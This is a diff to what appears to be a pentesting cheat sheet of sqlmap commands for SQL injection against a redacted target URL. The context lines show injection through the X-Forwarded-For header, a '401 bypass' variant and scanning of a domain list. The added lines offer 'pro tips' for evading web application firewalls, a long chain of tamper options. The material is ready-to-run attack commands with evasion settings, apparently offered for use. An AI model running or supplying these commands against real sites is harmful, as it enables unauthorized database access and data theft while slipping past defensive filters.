@@ -109,6 +109,9 @@ $ sqlmap -m domain2.txt -dbs --batch --random-agent
 $ sqlmap -u "http://redacted.com" --header="X-Forwarded-For: 1*" --dbs --batch --random-agent --threads=10
 // **SQL Injection bypass 401**
 $ sqlmap -u "http://redacted.com" --dbs --batch --random-agent --forms --ignore-code=401
+
+// PRO TIPS FOR BYPASSING WAF, add to SQLmap this tamper
+--tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,ifnull2ifisnull,modsecurityversioned,space2comment,randomcase
 ```
 
 ---
